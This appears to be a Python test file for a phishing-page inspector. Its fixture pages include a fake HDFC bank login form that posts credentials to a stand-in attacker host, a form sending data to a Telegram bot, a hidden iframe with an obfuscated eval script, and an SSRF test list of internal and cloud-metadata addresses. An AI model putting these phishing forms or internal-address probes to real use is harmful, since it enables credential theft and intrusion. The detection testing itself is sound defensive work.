"""Run: python tests/test_inspector.py   (plain asserts, no pytest needed)"""
import socket
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import inspector  # noqa: E402

PAGES = {
    "/phish": (200, "<html><head><title>HDFC NetBanking Login</title></head><body><h1>Welcome</h1>"
                    "<form action='http://evil.example/steal' method=post><input name=user><input type=password name=pw>"
                    "<input name=otp placeholder='Enter OTP'></form></body></html>"),
    "/tg": (200, "<title>Verify</title><form action='https://api.telegram.org/bot123:ABC/sendMessage'><input type=password></form>"),
    "/ok": (200, "<title>Daily News</title><body>" + "word " * 200 + "<form action='/subscribe'><input type=email name=email></form></body>"),
    "/hidden": (200, "<title>x</title><iframe src='http://t.example' width=0 height=0></iframe>"
                     "<script>eval(atob('YWxlcnQoMSk='))</script>" + "<p>" + "hello " * 60 + "</p>"),
    "/meta": (200, "<meta http-equiv='refresh' content='0;url=http://other.example/landing'>"),
    "/gtm": (200, "<title>Shop</title><body>" + "word " * 100 + "<noscript><iframe src='https://www.googletagmanager.com/ns.html?id=GTM-X' height=0 width=0 style='display:none;visibility:hidden'></iframe></noscript></body>"),
    "/gtm2": (200, "<title>Shop</title><body>" + "word " * 100 + "<iframe src='https://www.googletagmanager.com/ns.html' height=0 width=0></iframe></body>"),
    "/shop": (200, "<title>Cart</title><body>" + "word " * 100 + "<form><input name=q placeholder='Search gift card'><input name=pincode placeholder='PIN code'></form></body>"),
    "/news": (200, "<title>Tech news</title><body>" + "WhatsApp whatsapp WhatsApp " * 30 + "<form><input type=email></form></body>"),
    "/jsms": (200, "<title>Microsoft page</title><body><div id=root></div><script>/*kit*/</script></body>"),
    "/ppl": (200, "<title>PayPal Login</title><body>" + "word " * 80 + "<form><input type=email></form></body>"),
    "/blog": (200, "<title>Ten Microsoft Office tips and tricks for busy teams</title><body>" + "word " * 120 + "<form><input name=q></form></body>"),
    "/pie": (200, "<title>Apple Pie Recipe</title><body>" + "word " * 120 + "<form><input name=q></form></body>"),
    "/r1": (302, "/r2"), "/r2": (302, "/phish"), "/loop": (302, "/loop"),
}


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        path = self.path.split("?")[0]
        if path == "/big":
            self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers()
            try:
                for _ in range(300):
                    self.wfile.write(b"<p>" + b"x" * 8000 + b"</p>")
            except OSError:
                pass
            return
        if path == "/slow":
            self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers()
            try:
                for _ in range(40):
                    self.wfile.write(b"<p>drip</p>"); self.wfile.flush(); time.sleep(0.5)
            except OSError:
                pass
            return
        code, body = PAGES.get(path, (404, "nope"))
        self.send_response(code)
        if code == 302:
            self.send_header("Location", body); self.end_headers(); return
        self.send_header("Content-Type", "text/html"); self.end_headers(); self.wfile.write(body.encode())


srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
BASE = f"http://127.0.0.1:{srv.server_address[1]}"
passed = 0


def check(name, cond, extra=""):
    global passed
    assert cond, f"FAIL: {name} {extra}"
    passed += 1
    print(f"  ok  {name}")


def titles(ins):
    return [f["title"] for f in ins["findings"]]


print("page analysis")
i = inspector.inspect_url(BASE + "/phish", allow_private=True)
check("detects cross-domain login form", any("different website" in t for t in titles(i)), titles(i))
check("detects OTP request", any("OTP" in t for t in titles(i)))
check("detects brand impersonation (HDFC)", any("pretends to be Hdfc" in t for t in titles(i)), titles(i))
check("title captured", i["title"] == "HDFC NetBanking Login")

i = inspector.inspect_url(BASE + "/tg", allow_private=True)
check("detects Telegram exfiltration", any("Telegram" in t for t in titles(i)), titles(i))

i = inspector.inspect_url(BASE + "/ok", allow_private=True)
check("benign newsletter page: no findings", titles(i) == [], titles(i))

i = inspector.inspect_url(BASE + "/hidden", allow_private=True)
check("hidden iframe from unfamiliar site", any(t.startswith("Hidden iframe") for t in titles(i)), titles(i))
check("obfuscated script", "Obfuscated script" in titles(i))

i = inspector.inspect_url(BASE + "/gtm", allow_private=True)
check("Tag Manager noscript iframe is NOT flagged", titles(i) == [], titles(i))
i = inspector.inspect_url(BASE + "/gtm2", allow_private=True)
check("visible-script Tag Manager hidden iframe is NOT flagged", titles(i) == [], titles(i))
i = inspector.inspect_url(BASE + "/shop", allow_private=True)
check("'gift card' search + 'PIN code' fields are NOT sensitive", titles(i) == [], titles(i))
i = inspector.inspect_url(BASE + "/news", allow_private=True)
check("brand mentions without a login form are NOT impersonation", titles(i) == [], titles(i))

i = inspector.inspect_url(BASE + "/jsms", allow_private=True)
check("bare JS page titled 'Microsoft page' on an unrelated site is flagged", any("names Microsoft" in t for t in titles(i)), titles(i))
i = inspector.inspect_url(BASE + "/ppl", allow_private=True)
check("'PayPal Login' title on an unrelated site is flagged", any("names Paypal" in t for t in titles(i)), titles(i))
i = inspector.inspect_url(BASE + "/blog", allow_private=True)
check("long blog title mentioning Microsoft is NOT flagged", titles(i) == [], titles(i))
i = inspector.inspect_url(BASE + "/pie", allow_private=True)
check("'Apple Pie Recipe' is NOT flagged", titles(i) == [], titles(i))

print("redirects")
i = inspector.inspect_url(BASE + "/r1", allow_private=True)
check("follows 2 redirects to final page", len(i["chain"]) == 3 and i["final_url"].endswith("/phish"), i["chain"])
check("scans the FINAL page", any("different website" in t for t in titles(i)))
i = inspector.inspect_url(BASE + "/meta", allow_private=True)
check("follows meta refresh", any(h.get("via") == "meta refresh" for h in i["chain"]), i["chain"])
i = inspector.inspect_url(BASE + "/loop", allow_private=True)
check("redirect loop stops", i["error"] == "too many redirects" and len(i["chain"]) == inspector.MAX_HOPS + 1, i["chain"])

print("resource limits")
t = time.time(); i = inspector.inspect_url(BASE + "/big", allow_private=True)
check("huge body handled quickly and capped", time.time() - t < 5 and i["fetched"])
t = time.time(); i = inspector.inspect_url(BASE + "/slow", allow_private=True)
el = time.time() - t
check("slow-drip server cut off at deadline", el < inspector.TOTAL_TIMEOUT + 2, f"{el:.1f}s")

print("SSRF guard")
for target in ("http://127.0.0.1/", "http://localhost/", "https://127.0.0.1/admin", "http://10.0.0.5/", "http://169.254.169.254/latest/meta-data/",
               "http://192.168.1.1/", "http://[::1]/"):
    i = inspector.inspect_url(target)
    check(f"blocks {target.split('//')[1][:28]}", (not i["fetched"]) and "blocked" in (i["error"] or ""), i["error"])
i = inspector.inspect_url("http://8.8.8.8:22/")
check("refuses unusual port", "unusual port" in (i["error"] or ""), i["error"])
i = inspector.inspect_url("ftp://example.com/x")
check("refuses non-web scheme", not i["fetched"])

print("redirect from a public host to an internal address is never connected to")
real_gai, real_cc = socket.getaddrinfo, socket.create_connection
connected = []
MAP = {"a.test": "8.8.8.8", "b.test": "10.0.0.5"}


def fake_gai(host, port, *a, **k):
    ip = MAP.get(host)
    return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port))] if ip else real_gai(host, port, *a, **k)


def fake_cc(addr, timeout=None, *a, **k):
    connected.append(addr[0])
    c, s = socket.socketpair()

    def serve():
        s.recv(4096)
        s.sendall(b"HTTP/1.1 302 Found\r\nLocation: http://b.test/secret\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"); s.close()
    threading.Thread(target=serve, daemon=True).start()
    return c


socket.getaddrinfo, socket.create_connection = fake_gai, fake_cc
try:
    i = inspector.inspect_url("http://a.test/")
finally:
    socket.getaddrinfo, socket.create_connection = real_gai, real_cc
check("only the public IP was connected to", connected == ["8.8.8.8"], connected)
check("second hop reported as blocked", i["chain"][-1].get("error", "").startswith("blocked"), i["chain"])

print(f"\nall {passed} checks passed")
